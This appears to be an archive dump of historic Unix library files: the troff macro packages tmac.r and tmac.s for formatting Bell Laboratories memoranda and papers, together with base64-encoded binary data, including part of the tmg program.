YeJsBvN0YWJsBOFibAPibATkYWwE7WFsBPNhbATsaWvlZ/VhZwXyaWFnBWVy4WcEbeFnBG
vhZwRk4WcE92lmBetuaWYD82UE5nJl4mUE92lkBPRpZATzaWQG8XVlbmMH5mx15W5jJmVz
5W5jBmVy5W5jBWnlbmMl82FuYwZlcuFuYwZhcuFuYwXuYW5jB+JhbOFuYwVp4W5jB+p1c/
RpYwXzdGljBfBpZWMF8GxhY+EABfByb28E82VsA/JpJOxpZQAD7G8E7G9uBXT0aW4G83Ry
aW4FcvJpbgVw8GluBW7uaW4Fbe1pbgVs7GluBfpsaW4F9GxpbiVz7GluBXLsaW4F8Gxpbg
Zu62xpbgVr7GluBedsaW4F5mxpbgXkbGluBeNsaW4F4mxpbgZ59GhpbgdlZXRo6W4GZfRo
aW4FZ+dpbgVk5GluBWLiaW4D6W4ABe1vdXQF929ydAT3aXQFdPRpcwVl9GlzBXDwaXMFcu
5pcwVu7mlzBfBsaXMF53VpcwXnbGlzBWLsaXMFZ+dpcwVk5GlzA+lzBedyYXAH4m9y73Vn
BeJ1cmcE9mljA+5hA+xhBO1p4QAD9HID42iDaWaDZWQF4XNjaQAE929yBO1hcgTib28E92
FsBeNyYWME4mFjAAPmdQVz92VsBPRlbAXzaGVsBfN0YWwE83RhBOJhbAN25QN15QNr5QR0
aOUFdGNo5QNh5WTxdWEjdeED9GEEdXLhJWfv7mEEb27hA+5hBPRpYQTzaWEl9HJp4QRyae
EE7mnhBORp4QTjaWED52EE7WVhJPJlYQZj9GnjYQXzaeNhBOnjYQPjYQPiYQbub+1p4QAD
7nUFb/Jp9SNp9SNl9QVpdulzBPRpcwVp7WlzBWFs6XMkZelzJGHpcwTyb28D5G8D6GEG4f
JpdGgF8ml0aAAE9G93BORvdwT0dXIF83BvbwTub28E7W9vCWFs6fph9GlvB+n6YfRpbwds
6eH0aW8E9GlvJXPzaW8E82lvBG7pbwTnaW8E42lvA+NvA/RvA/NvA/JpA/BpA+5pA+1pA+
xpA+tpBfN0ZWkE9GFpBWdodOUF929t5QPtZQRv62UDa+UE9GVlBPNlZSPzYQX3b23hA+1h
BPRpYQTzaWEkZelhBONpYcNpYQXjbGVhBO1lYSNl4QAF7WFj8gAF53JvdQL1BPNoaQTrZW
UABPphcsJyA/RvI/NvJPJp7wRpeuUF42925QRv9mUE5XblCONvbfB1dOUldXP0ZQVvc3Tl
JeFj9GUG93JpdOUlaXP0ZSVlc/RlJWFz9GUE83RlBWFy9GUEcnTlJW3l9GUF92H0ZQNy5Q
RvcOUF8GHwZQR3buUkc+5lBG9u5QRybeUD7WUEbGzlBWTkbGUE4mxlA2vlBW70aGUG5mH0
aGUGZWn0aGUEdGjlBHNo5QTwaGUEY2jlBGRn5QRyZOUGb3VuZOUEbGTlBGlk5QXkdWPlBG
5j5ULlA/NhJmFj9exhJmVj9exhJmlj9exhJmVn9exhACR173UF9GlvdQXnaW91BeNpb3Uk
ae91Bedlb3UF42VvdQRl73Vi9QTuZXME7GVzYvMlcO/saWLpQ/hlQ/NlRHNo5URjaOXBAA
Zpb27pcwVpbulzBWFs6XMGbO/naXMFaHTlcwRp5XMFZ+dlcwRn5XMFZORlcwRk5XME42Fz
BehlYXIE5m9vA2nvBeZyb24F8HJpbgTtZW4F42llbgRp4W4G93JpZ2gG4nJpZ2gG5mxpZ2
gG92VpZ2gF82hpZgXjcmFmJGRn5QTnb2EE429hBOJvYQT3aGEE43VpACRlc/QlcXVp9AT0
afQlb3Pp9ATzafQFaW7p9ARuafQoZmHiaWzp9AjjYeJpbOn0CPBh4mls6fQG4mls6fQDaf
QE4nVyBPRv8gXxdWFyJHXhcgftZW70YfIGaW9u4XIEaeFyBG7v7QPwbARn52wF8GHibAVm
YeJsBeNh4mwE4WJsA+JsAuwD82smZ/Jh8GgEbO/nAuYD7mUD7GUEY2vlA+tlBOJvZAXzdH
Vk5GVlZALiA/dhA+RhAAA=
-- /usr/lib/tmac.r mode=0100664 uid=3 gid=3 atime=169848951 mtime=169259120 --
.de HD
.if t .tl '\(rn'''
.if t 'sp  \\n(m1-1
.if n 'sp \\n(m1
.ps 10
.ft R
.if e .1e
.if o .1o
.ps
.ft
'sp \\n(m2
.if \\n(:n .nm 1 1 2
.ns
..
.wh 0 HD
.de FT
'sp \\n(m3
.ps 10
.ft R
.if e .2e
.if o .2o
.ps
.ft
'bp
..
.wh -7 FT (1inch)
.de m1
.nr m1 \\$1
..
.de m2
.nr m2 \\$1
..
.de m3
.nr m3 \\$1
.ch FT -\\n(m3-\\n(m4-2
..
.de m4
.nr m4 \\$1
.ch FT -\\n(m3-\\n(m4-2
..
.m1 3
.m2 2
.m3 2
.m4 3
.de he
.de 1e
.tl \\$1 \\$2 \\$3 \\$4 \\$5 \\$6 \\$7 \\$8 \\$9
\\..
.de 1o
.tl \\$1 \\$2 \\$3 \\$4 \\$5 \\$6 \\$7 \\$8 \\$9
\\..
..
.de fo
.de 2e
.tl \\$1 \\$2 \\$3 \\$4 \\$5 \\$6 \\$7 \\$8 \\$9
\\..
.de 2o
.tl \\$1 \\$2 \\$3 \\$4 \\$5 \\$6 \\$7 \\$8 \\$9
\\..
..
.de eh
.de 1e
.tl \\$1 \\$2 \\$3 \\$4 \\$5 \\$6 \\$7 \\$8 \\$9
\\..
..
.de oh
.de 1o
.tl \\$1 \\$2 \\$3 \\$4 \\$5 \\$6 \\$7 \\$8 \\$9
\\..
..
.de ef
.de 2e
.tl \\$1 \\$2 \\$3 \\$4 \\$5 \\$6 \\$7 \\$8 \\$9
\\..
..
.de of
.de 2o
.tl \\$1 \\$2 \\$3 \\$4 \\$5 \\$6 \\$7 \\$8 \\$9
\\..
..
.he ''''
.fo ''''
.de bl
.rs
.sp \\$1
..
.de n1
.nm \\$1 1 2
.nr :n 0
.if \\n(.$ .nr :n 1
..
.de n2
.nm \\$1 1 2
..
.if n .ll 60
.if n .lt 60
.if t .ll 6i
.if t .lt 6i
-- /usr/lib/tmac.s mode=0110664 uid=3 gid=3 atime=169848955 mtime=169848613 --
.nr DO \n(.o
.nr tm 0
.		RT - reset everything to normal state
.de RT
.if !\\n(1T .BG
.if !\\n(IK .di
.ce 0
.ul 0
.if \\n(IP .in -\\n(IQn
.if !\\n(IP .nr IQ 5
.if \\n(IP .nr IP -1
.ft R
.if t .ta 5n 10n 15n 20n 25n 30n 35n 40n 45n 50n 55n 60n 65n 70n 75n 80n
.if n .ta 6 11 16 21 26 31 36 41 46 61 56 61 66 71 76 81
.ps \\n(PS
.vs \\n(VSp
.fi
..
.	IZ - initialization
.de IZ
.br
.if n .nr y 0-6
.if t .nr y -1i
.nr x 0 1
.nr IP 0
.nr IQ 5
.nr PS 10
.nr VS 12
.ps \\n(PS
.vs \\n(VSp
.nr TB 0
.if t .CM
.if t .nr LL 6i
.if n .nr LL 60
.ll \\n(LLu
.nr LT \\n(.l
.lt \\n(LTu
.if n .tc ~
.if n .tr ~ 
.if n .ds CH "- % -
.if t .ds CH "\(en % \(en
.ds Ch \\*(CH
.if n .ds CF "\\*(DY
.wh 0 NP
.if t .wh -1i FO
.if n .wh -6 FO
.if n .wh -3 BT
.if t .wh -.5i BT
.if t .nr EP 10.i
.if n .nr EP 60
..
.de TM
.pi /usr/bin/col
.nr ST 1
.ds MN \\$1
.nr MM \\n(.$
.nr tm 1
.if \\n(.$-1 .ds CA \\$2
.if \\n(.$-2 .ds CC \\$3
.rm RP
.rm S0
.rm S2
.rm AX
..
.de RP
.nr ST 2
.rm SG
.rm CS
.rm TM
..
.	TL - title and initialization
.de TL
.nr TV 1
.di WT
.na
.fi
.if n .ll 50
.if n .if \\n(tm .ll 30
.if t .ll 5.0i
.if t .if \\n(tm .ll 3.5i
.ft B
.if !\\n(tm .ps 12
..
.de TX
.rs
.if t .sp .5i
.if n .sp 3
.ce 1000
.if n .ul 1000
.ps 12
.ft B
.vs 15p
.ne 4
.WT
..
.		AU - author(s)
.de AU
.nr AV 1
.ad
.br
.di
.br
.nf
.nr NA +1
.ds R\\n(NA \\$1
.ds E\\n(NA \\$2
.di A\\n(NA
.ll \\n(LLu
.if !\\n(tm .ft I
.if \\n(tm .ft B
.if \\n(tm .if n .ll 16
.if \\n(tm .if t .ll 1.4i
.ps 10
..
.de AX
.ft R
.rs
.ce 1000
.if n .ul 0
.ps 10
.vs 12p
.if n .sp 2
.if t .sp
.A1
.if n .sp 
.if t .sp 0.5
.I1
.if \\n(NA-1 .if n .sp 2
.if \\n(NA-1 .if t .sp
.A2
.if \\n(NA-1 .if n .sp
.if \\n(NA-1 .if t .sp 0.5
.I2
.if \\n(NA-2 .if t .sp
.if \\n(NA-2 .if n .sp 2
.A3
.if \\n(NA-2 .if t .sp 0.5
.if \\n(NA-2 .if n .sp
.I3
.if \\n(NA-3 .if t .sp
.if \\n(NA-3 .if n .sp 2
.A4
.if \\n(NA-3 .if t .sp 0.5
.if \\n(NA-3 .if n .sp
.I4
.if \\n(NA-4 .if t .sp
.if \\n(NA-4 .if n .sp 2
.A5
.if \\n(NA-4 .if n .sp
.if \\n(NA-4 .if t .sp 0.5
.I5
..
.	AI - authors institution
.de AI
.br
.ft R
.di
.di I\\n(NA
.nf
..
.	AB - begin an abstract
.de AB
.br
.di
.ll \\n(LTu
.nr 1T 1
.nr IK 1
.di WB
.rs
.ce 1
.if t .ft I
.if n .ul
.ll \\n(LTu
ABSTRACT
.sp
.fi
.if t .ft R
.nr oi \\n(.i
.if n .in +\\n(.l/12
.if t .in +\\n(.lu/12u
.if t .ll -\\n(.lu/12u
.if n .ll -\\n(.l/12
.br
.ps \\n(PS
.if t .ti +5n
.if n .ti +5
..
.	AE - end of an abstract
.de AE
.br
.di
.ll \\n(LLu
.nr 1T 0
.nr IK 0
.if n .in \\n(oi
.if t .in \\n(oiu
.di
.ce 0
.if \\n(ST-1 .SY
.rm SY
..
.	OK - "other keywords" for cover sheet.
.de OK
.br
.di
.di OD
.nf
.ft B
..
.	CS - spew out cover sheet
.de CS
.br
.di
.if t .pl 15i
.tr ~
.if n .sp 6
.if t .po 0.5i
.if t .sp .5i
.if t .lg
.if t .ll 7.0i
.nf
       \s24\(bs\s12\fB  Bell Laboratories        \s16\fRCover Sheet for Technical Memorandum
.sp
.if t \s6\l'7i'
.fi
.ps 9
.ft I
.if t .sp 2p
The information contained herein is for the use of employees of Bell Laboratories and is not for publication.  (See GEI 13.9-3)\p
.ft R
.nf
.if t \s6\l'7i'
.sp
.if t .ll 6.0i
.if n .ll 30
.if t .po 1.0i
.ps 9
.if t .ta 0.5i 4.5i 4.9i
.if n .ta 10 40 47
.mk
Title- \fB\s10
.rt
.if t .in 0.5i
.if n .in 10
.WT
.rt
.ll \\n(LLu
.if t .in 4.5i
.if n .in 40
\s9\fRDate-\s10\fB
.rt
.if t .in 4.9i
.if n .in 47
\\*(DY
.sp
.if t .ti 4.5i
.if n .ti 40
.mk
\s9\fRTM-\fB\s10
.br
.rt
.CT \\*(MN
.rt
.in 0
.sp
.mk
\s9\fROther Keywords-\fB
.rt
.if t .in 1.1i
.if n .in 20
.OD
.rm OK
.rm OD
.in 0
.if t .sp .7i
.if n .sp 3
.ps 9
.if t .ta 1.8i 3.3i 4.3i
.if n .ta 20 35 45
.ft R
Author	Location	Extension	Charging Case- \s10\fB\\*(CA
.ps 10
.nf
.mk
.A1
.rt
	\\*(R1	\\*(E1	\fR\s9Filing Case- \s10\fB\\*(CC
.if \\n(NA-1 .CB 2
.if \\n(NA-2 .CB 3
.if \\n(NA-3 .CB 4
.if \\n(NA-4 .CB 5
.ft R
.if t .sp .4i
.if n .sp 2
.WB
.br
.if t .sp |8.3i
.if n .sp 5
.FF
.rm FF
.if t .sp |9.3i
.nr x 50-\\n(nl
.if n .sp \\nx
.if t .po 0.5i
.if t .ll 7i
.nf
.if t \l'7i'
.if t .ta 1.4i 2.8i 4.2i
.if n .ta 15 30 45
.if t .sp 8p
Pages Text   \\$1	Other   \\$2	Total   \\$3
.if t .sp 8p
.if n .sp 
.if t No. Figures   \\$4	No. Tables   \\$5	No. Refs.   \\$6	\b'|||||~~'
.if n No. Figures   \\$4	No. Tables   \\$5	No. Refs.   \\$6
.if t \l'7i'
.ps 7
.if n .sp
.tl 'E-1932-C (6-73)'SEE REVERSE SIDE FOR DISTRIBUTION LIST''
.if t .po 0.5i
.ll \\n(LLu
.fi
.if t .sp |10.8i
.if t .po 0
.ps 10
.if t .tl '-'''
.if t .pl
.bp 1
.if t .po \\n(DOu
..
.	CB - help with cover sheet
.de CB
.br
.mk
.A\\$1
.rt
.if \\$1-1 .if !\\$1-2 \&	\\*(R2	\\*(E2
.if \\$1-2 .if !\\$1-3 \&	\\*(R3	\\*(E3
.if \\$1-3 .if !\\$1-4 \&	\\*(R4	\\*(E4
.if \\$1-4 .if !\\$1-5 \&	\\*(R5	\\*(E5
.br
..
.de CT
\\$1
\\$2
\\$3
\\$4
..
.	S1 - tm style 
.de S1
.if n .sp 6
.if t .sp .75i
.if t .ta 4.75i
.if n .ta 47
.ll 80
.ps 36
.br
.if t \t\(bs
.vs .25i
.ps 12
.br
.ft B
.nf
\tBell Laboratories
.ft R
.fi
.na
.ps 8
.vs 12p
.if n .sp 3
.if t .sp .5i
.mk
.fi
.ll
.if n .ll 40
.if t .ll 4.0i
Subject:
.ft B
.ps
.WT
.ft R
.br
.if \\n(MM-1 \\s8Case- \\*(CA\\s10
.if \\n(MM-2 --\s8 File- \\*(CC\\s10
.br
.rt
.if n .ll 70
.if t .ll 6.5i
.if t .in 5.10i
.if n .in 52
.ps 8
.mk
.ti -6n
date:
.ps \\n(PS
.ft B
.br
.rt
\\*(DY
.sp
.ft R
.ps 8
.mk
.ti -6n
from:
.ps
.br
.rt
.ft B
.A1
.br
.A2
.br
.A3
.br
.A4
.br
.A5
.ft R
.sp
.mk
.ps 8
.ti -6n
.ft R
.if \\n(MM TM:
.br
.rt
.ps
.ft B
.hy 0
.ll 10n
.if \\n(MM \\*(MN
.hy
.ll
.ft R
.ll \\n(LLu
.in
.sp
.ad
.ce
.ft I
MEMORANDUM FOR FILE
.ft R
.sp
.ad
..
.	S2 - release paper style
.	SY - cover sheet of released paper
.de SY
.ll \\n(LLu
.sp 6
.ns
.if \\n(TV .TX
.if \\n(AV .AX
.ce 0
.nf
.sp 3
.WB
.fi
..
.	S2 - first text page, released paper format
.de S2
.SY
.rm SY
.bp 1
.if \\n(TV .TX
.if \\n(AV .AX
.ce 0
.ft R
.ad
..
.	S0- mike lesk conserve paper style
.de S0
.ll \\n(LLu
.rs
.sp 6
.ns
.if \\n(TV .TX
.if \\n(AV .AX
.ce 0
.nf
.WB
.fi
.ad
..
.	SG - signature
.de SG
.nf
.if n .in +2*\\n(.l/3
.if t .in +2u*\\n(.lu/3u
.sp 2
.A1
.if \\n(NA-1 .sp 2
.A2
.if \\n(NA-2 .sp 2
.A3
.if \\n(NA-3 .sp 2
.A4
.if \\n(NA-4 .sp 2
.A5
.in
\\$1
.br
..
.	Tables.  TS - table start, TE - table end
.de TS
.br
.RT
.ul 0
.if t .sp 0.5
.if n .sp
.nf
..
.de TE
.fi
.if n .sp 1
.if t .sp 0.5
..
.	DS - display.  If .DS C, center; L, left-adjust; I, indent.
.de DS
.KS
.\\$1D
..
.de CD
.ce 1000
.nf
.nr oi \\n(.i
.if t .sp 0.5
.if n .sp 1
..
.de D
.ID
..
.de ID
.nf
.nr oi \\n(.i
.if t .sp 0.5
.if n .sp 1
.if t .in +0.5i
.if n .in +8
..
.de LD
.nf
.nr oi \\n(.i
.if t .sp 0.5
.if n .sp 1
..
.	DE - display end
.de DE
.ce 0
.if n .in \\n(oi
.if t .in \\n(oiu
.KE
.if t .sp 0.5
.if n .sp 1
.fi
..
.	KS keep - for keep release features. As in IBM
.de KS
.if !\\n(IK .KQ
.nr IK +1
..
.	KQ - real keep processor
.de KQ
.br
.di KK
.nr TB 0
..
.	KF - floating keep
.de KF
.if !\\n(IK .FQ
.nr IK +1
..
.	FQ real floating keep processor
.de FQ
.br
.di KK
.nr TB 1
..
.	KE release - everything between keep and release is together
.de KE
.if \\n(IK .if !\\n(IK-1 .RQ
.if \\n(IK .nr IK -1
..
.	RQ real release
.de RQ
.br
.di
.if \\n(dn+\\n(nl-\\n(EP .if !\\n(TB .sp 200
.if !\\n(dn+\\n(nl-\\n(EP .if \\n(TB .nr TB 0
.nf
.in 0
.if !\\n(TB .KK
.in
.fi
..
.	EQ default equation breakout
.de EQ
.if t .sp .5
.if n .sp
.ce
.ne 2
.ds EL \\$1
.if \\n(.$-1 .ds EL \\$2
.nr LE \\n(.$
.@\\$1
..
.	This nonsense permits recognition of .EQ L, .EQ I, .EQ C
.	by invoking macros @L, @I, and so forth.
.de @L
.ce0
.nr LE -1
..
.de @C
.nr LE -1
..
.de @I
.ce 0
.ti 10n
.nr LE -1
..
.de EN
.ce 0
.lt \\n(.lu
.if \\n(LE .if n .sp -1
.if \\n(LE .if n .tl '''\\*(EL'
.if n .sp 1
.if \\n(LE .if t .sp -1-\\n(.au
.if \\n(LE .if t .tl '''\\*(EL'
.if \\n(LE .if t .sp \\n(.au
.if t .sp 0.5
.ns
..
.	EM end up macro - process left over keep-release
.de EM
.if \\n(TB .br
.if \\n(TB 
.if \\n(TB .NP
..
.	NP new page
.de NP
.if t .CM
.if t 'sp 0.5i
.if n 'sp 3
.ft R
.lt \\n(LTu
.ps \\n(PS
.PT
.ps
.ft P
.if t 'sp 0.5i
.if n 'sp 3
.nr x 0 1
.if t .nr y 0-1i
.if n .nr y 0-6
.if \\n(MF .fz
.nr MF 0
.ns
.os
.ev 1
.if \\n(TB .nf
.if \\n(TB .KK
.if \\n(TB .fi
.ev
.nr TB 0
.mk
..
.de PT
.if \\n%-1 .tl '\\*(LH'\\*(Ch'\\*(RH'
..
.	FO - footer of page
.de FO
.nr FC +1
.nr dn 0
.if \\nx .xf
.nr MF 0
.if \\n(dn  .nr MF 1
.if t .ch FO -1i
.if n .ch FO -6
.if !\\n(FC-1 .if \\n(NX .RC
.if !\\n(FC-1 .if !\\n(NX 'bp
.nr FC -1
..
.	2C - begin double column
.de 2C
.if !\\n(1T .if n .sp 4
.if !\\n(1T .if t .sp 2
.RT
.mk
.nr NC 1
.nr NX 1
.nr L1 \\n(.l
.nr L2 \\n(.l*7/15
.if n .ll \\n(L2
.if t .ll \\n(L2u
.if n .FL \\n(L2*11/12
.if t .FL \\n(L2u*11u/12u
.nr RO \\n(L2*8/7
.ns
..
.de RC
.if \\n(NC-1 .C2
.if !\\n(NC-1 .C1
.nr NC \\n(ND
..
.de C1
.rt
.if n .po +\\n(RO
.if t .po +\\n(ROu
.nr ND 2
.nr x 0 1
.ns
..
.de C2
.po \\n(DOu
'bp
.nr ND 1
..
.	1C - return to single column format
.de 1C
.nr NX 0
.br
.po \\n(DOu
.nr ND 1
.if n .ll \\n(L1
.if t .ll \\n(L1u
.bp
..
.	.de R3
.	.ll 120
.	.pl 102
.	.nr LT \\n(.l
.	..
.de MH
Bell Laboratories,
Murray Hill, New Jersey 07974
..
.de BT
.ft R
.lt \\n(LTu
.tl '\\*(LF'\\*(CF'\\*(RF'
.ft P
..
.	PP - paragraph
.de PP
.RT
.ne 2
.if \\n(1T .if t .sp 0.3
.if \\n(1T .if n .sp
.if t .ti +5n
.if n .ti +5
..
.	SH - (unnumbered) section heading
.de SH
.RT
.if \\n(1T .sp 1
.if !\\n(1T .BG
.RT
.ne 7
.ft B
.if n .ul 1000
..
.	NH - numbered heading
.de NH
.RT
.if \\n(1T .sp 1
.if !\\n(1T .BG
.RT
.ne 7
.ft B
.if n .ul 1000
.nr a \\$1
.if !\\n(.$ .nr a 1
.if !\\na .nr a 1
.nr H\\na +1
.if !\\na-4 .nr H5 0
.if !\\na-3 .nr H4 0
.if !\\na-2 .nr H3 0
.if !\\na-1 .nr H2 0
.if !\\$1 .if \\n(.$ .nr H1 1
.ds SN \\n(H1.
.if \\na-1 .as SN \\n(H2.
.if \\na-2 .as SN \\n(H3.
.if \\na-3 .as SN \\n(H4.
.if \\na-4 .as SN \\n(H5.
\\*(SN
..
.	BG - begin, execute at first PP
.de BG
.br
.di
.ce 0
.nr 1T 1
.S\\n(ST
.rm S0
.rm S1
.rm S2
.rm OK
.rm OD
.rm TX
.rm AX
.rm WT
.rm I1
.rm I2
.rm I3
.rm I4
.rm I5
.rm CB
.rm E1
.rm R1
.rm R2
.rm E2
.de TL
.ft B
.sp
.if n .ul 100
.ce 100
.LG
\\..
.de AU
.ft I
.if n .ul 0
.ce 100
.sp
.NL
\\..
.de AI
.ft R
.ce 100
.if n .ul 0
.if n .sp
.if t .sp .5
.NL
\\..
.ds Ch \\*(CH
.if n .sp 2
.if t .sp 1
.fi
.ll \\n(LLu
..
.	IP - indented paragraph
.de IP
.RT
.if !\\n(IP .nr IP +1
.if t .sp 0.3
.if n .sp
.ne 3
.if \\n(.$-1 .nr IQ \\$2
.LB "\\$1"
..
.	LP - left aligned (block) paragraph
.de LP
.RT
.if t .sp 0.3
.if n .sp
.ne 3
.if \\n(.$ .LB \\$1
..
.	IE - synonym for .LP
.de IE
.LP
..
.	LB - label paragraph
.de LB
.in +\\n(IQn
.if n .ta \\n(IQ+1
.if t .ta \\n(IQn
.ti -\\n(IQn
\\$1\t\c
..
.	RS - prepare for double indenting
.de RS
.in +\\n(IQn
.nr IP +1
..
.	RE - retreat to the left
.de RE
.br
.in -\\n(IQn
..
.	CM - cut mark
.de CM
.po 0
.tl '-'''
.po
..
.	B - bold font
.de B
.ft B
.if n .ul 1000
..
.	R - Roman font
.de R
.ft R
.if n .ul 0
..
.	I - italic font
.de I
.ft I
.if n .ul 1000
..
.	TA - tabs set in ens or chars
.de TA
.ta \\$1n \\$2n \\$3n \\$4n \\$5n \\$6n \\$7n \\$8n \\$9n
..
.	SM - make smaller size
.de SM
.ps -2
..
.	LG - make larger size
.de LG
.ps +2
..
.	NL - return to normal size
.de NL
.ps \\n(PS
..
.	DA - force date; ND - no date or new date.
.de DA
.if \\n(.$ .ds DY \\$1 \\$2 \\$3 \\$4
.ds CF \\*(DY
..
.de ND
.ds DY \\$1 \\$2 \\$3 \\$4
.rm CF
..
.if \n(mo-0 .ds mo January
.if \n(mo-1 .ds mo February
.if \n(mo-2 .ds mo March
.if \n(mo-3 .ds mo April
.if \n(mo-4 .ds mo May
.if \n(mo-5 .ds mo June
.if \n(mo-6 .ds mo July
.if \n(mo-7 .ds mo August
.if \n(mo-8 .ds mo September
.if \n(mo-9 .ds mo October
.if \n(mo-10 .ds mo November
.if \n(mo-11 .ds mo December
.if \n(dw-0 .ds dw Sunday
.if \n(dw-1 .ds dw Monday
.if \n(dw-2 .ds dw Tuesday
.if \n(dw-3 .ds dw Wednesday
.if \n(dw-4 .ds dw Thursday
.if \n(dw-5 .ds dw Friday
.if \n(dw-6 .ds dw Saturday
.ds DY \*(mo \n(dy, 19\n(yr
.IZ
.rm IZ
.rm mo
.de FN
.FS
..
.	FS - begin footnote
.de FS
'ce 0
.di
.da FF
.ev1
.if !\\n+x-1 .fs
..
.	FE - footnote end
.de FE
.br
.in 0
.ev
.di
.if t .if !\\nx-1 .nr dn +\\n(.v
.nr y -\\n(dn
.if n .ch FO \\ny
.if t .ch FO \\nyu
.if t .if \\n(nl+\\n(.v-\\n(.p-\\ny .ch FO \\n(nlu+\\n(.vu
.if n .if \\n(nl-\\n(.p-\\ny .ch FO \\n(nl+1
..
.de fs SEPARATOR
.if n __________________________
.if t \l'1i'
.br
..
.de fz
.FS
.nf
.fy
.fi
.FE
..
.de fx
.di fy
..
.de xf
.ev1
.nf
.FF
.rm FF
.di
.fi
.ev
..
.de FL
.ev1
.ll \\$1
.ev
..
.de HO
Bell Laboratories,
Holmdel, New Jersey 07733
..
.de WH
Bell Laboratories,
Whippany, New Jersey 07981
..
.if t .ch FO 12i
.if t .wh -1i fx
.if t .ch FO -1i
.if n .ch FO 100
.if n .wh -6 fx
.if n .ch FO -6
.ev1
.ll \n(LLu
.if n .ll -\\n(.l/12
.if t .ll -\\n(.lu/12u
'ps8
'vs10p
.ev
.br
.em EM
-- /usr/lib/tmg mode=0110775 uid=3 gid=3 atime=174924579 mtime=174924578 base64=1 --
BwFkKyAAvgwAAAAAAAABAM4KFAO3HQQAAgAFiQAAAAAehzcQYivOCgkDtx0GAAIACIkAAL
YBE4c3EFQrxRUEMTUKBgA1CggANQoKAEQRxGUOAMAVcgP3CVoB9wnsAgqJVAABiWFsbG9j
LmQA9x0eKxgr9wmaAsAVdAD3CZIC9wnIAgQALS1mYXRhbAoAALcK4ir1NQEAAgBDArcK2C
r3C9oqBAPAFXIA9wmOGfcJsAI1EAIAwEUBABcgcgMUhxcgDBYShxcgeCsOhzcInv9iYWQg
YWRkcmVzcyBpbiBwYXJzaW5nAABIAPcJyADQhrcKhir1NQEAAgAnAvcJYgI1EAIAwEUBAB
cgAgEFAxcgBgEbAtMLvAH3CUYCAxC+AfsBQBHAZQ4A9wnQAEQRRRNDHQQANR0GAAYANR0I
AAgAwAsBAxQQoQCHAEQRRRNDHQQAsQCHAMEdNioCAcEdMirmHSgqdxAkKmYdCAAmEfcJ8A
H3CUAAGYcWIREHABn3CUwXQx0IAAMLw2VULGYRBRE1CgIA9wmMAIUVQx0EALUVCAC3FeYp
dwDm/oQVtRUIALcV2CmdAbcKwilMEfUQBAB0HQYABgB0HQgACAB0HQoACgAFEcRlDgAXIS
Q0BYYDEHUQDAB3ALT+NwiC/nN0YWNrIG92ZXJmbG93AAAEIAKHAAqHACYQARBAFEQgCQNm
EPcJuhaBFUAURCD5g0AdCACEFYcA9TUBAAIABQPF5QgAQx0EAIcA9wtEKQQDwBVnAPcJ+B
fAFDUQAgDARQEAFyByAxqHFyAMFhiHFyB4KxSHAAsXILAEH4c3CAL+YmFkIGFkZHJlc3Mg
aW4gdHJhbnNsYXRpb24AAEgA9RAEAAMQdR0AAAgAdR0GAA4AxWUIAPcJkv+/AXURAADAZV
QsAxDCAcCUwpSACsAM9RAEAHURDgBBHQAAQxwEAAPgxWUIAHURAADCDBIDwxIDCwkENwiM
/W5vdCBhIGJ1bmRsZQAA1yCwBLmGw2VULIPg9wk2/5EBJgomEIAR9wkGAMZlBACHAPctdi
h2KAcDJhD3CSwAgBX3HWYoZijBHWgoyIsNAzGUFCyBCncQWihXIEAA9gUmEPcJBgCAFeQB
hwD3HUQoCADAHTgoBIkULAAANwo0KIcAQRHAFA0EJhDORf7/gENBHAwAQGwEAAAS+gVBHA
wAgFWHAHUDpBfeFLwEBgF4A0oBxgMGAYoDRAHwA7wEBgGKA0oBIgQGAYoDRAHwAwYBigNI
EksBsgQxIAAAThqmA6ACAQAJFqYTPxqrA6ACAgBIGjoAoQIBAEoBtAOuEyIEPxq7AwEAAg
BJGjsAPz8/IAAACBZOGtoDoAICAKACAQAJFjYbpBfoFAwW0gOoGdQDaBbuGDsAAgEQBD4a
1wMOARIEyBQ/GuEDoAICAAgWoAIBAAkWbATWEAIBMgTuGDsADgFEBBQFBgFEBFIEBgFEBF
wK7hg7AD8aFwSgAgIACBahAgEAGhTuGDsAUgQCAYATPxpJBKACAgAIFqECAQCABGwEAgGA
Ez8aYwSgAgEASRo6ACoU7hg6AD8aeQQucG46MSAucHhzOzEyAC50bjoxIC50eHM7MTIATh
qKBAgWThqYBAkWPxqnBC8qAAAEAPQYtgSkF7oE7hgqAKQX6BTuGC8AAwHABAAAGhoBAKAC
AgChAgEAGhoBABMCGhoBAKACAgDcFAgWoQIBANQUoQIBANAUMSBzdWNjAACgAgEA3BQIFk
8aAAXSGuoU0hrUBLAavhpAFPQUQBT6FHYFAgE+BZYF1AXuGCkAPhrXBA4BRAU+GuMELAk4
FggGAgFYBT4a6QQGAUQFDgFuBe4YOwA6CQIBagU+GvsEDgFuBT4aCQV/AHByb2MoADYbpB
foFPUYcAVXGPwUcGFyYW1zOwBOGoQFoAIBAAkW0BOmBQIByBTsE4AFPxqNBS4UYxT6FPwU
AAAqFNIaAhW8F78aVxgCFXB1c2g7AE4avgWgAgEACBagAgIACRbuGDsAAgHIFNIaAhXSGq
4FsBq+GtATsAXsE7oFPxrFBRoaAQChAgEA3BTUFBoaAQChAgEAmAYCARYGPhr1BQ4BHgZs
BCwJPhoBBn8Ac2FsdDsAGhoCAKACAwDcFNwUCBZOGiAGoAICAAgWoAIBANgU1BQIFqACAg
BJGjoAYWx0OwAACBZOGlAGoQIBAGdvdG87ABoaAgCgAgQAVgbUFAgWThpgBqACAwAIFqAC
AQBIGjoAoAICANgU1BQIFqACAwBJGjoA0hr4FNIa9hSwGr4a8gbuGHwAAgHaBtIa9hTSGv
gUsBq+GqYTSAkCAcwGmAY+GicGDgHUBpgGphM+GmcGLAkOAdoGfwAaGgIAoAICANgU3BQI
FqECAQDcFNQUJAcOCPIGAgEMBz4a3QY6CQIBgBMeCQ4BDAd/ABoaAgCgAgEA1BTrGQIAAQ
AaGgIAEwKkBwIBNAc+Gg8HEAkOAVYH7hgoAIoYHAf4FJgGAgFMB+4YKQAOAVYH7hgpAD4a
HwcsCX8AGhoBAOoZAQCgAgIACBahAgEAGhoBAOoZAQChAgEAYWx0OwAATxp2B1wAc2FsdD
sATxqCBxoaAQCgAgMA3BQIFuoZAQCgAgIAoQIBALQJBgHkByoK7hg6AAIBugfeAA4B5AdG
CAYBwAekF+gU7hgoAAIB4AekF94U0BNYCO4YKQA+GlkHDgHkBz4aawfuGC8AAgH0Bz4afQ
cOAQAI9BiABwIBCgg+GokHKgo+Go0HDgEKCH8AAADuGC4AAgGAE6QX6BQuFAYBUgjSGvQU
xhoGAToIxBn0FNIa9hTSGgwIsBq+GtIa9hS8F78aDRbiFO4YLgCkF+gUuBNCCGMU9BT2FC
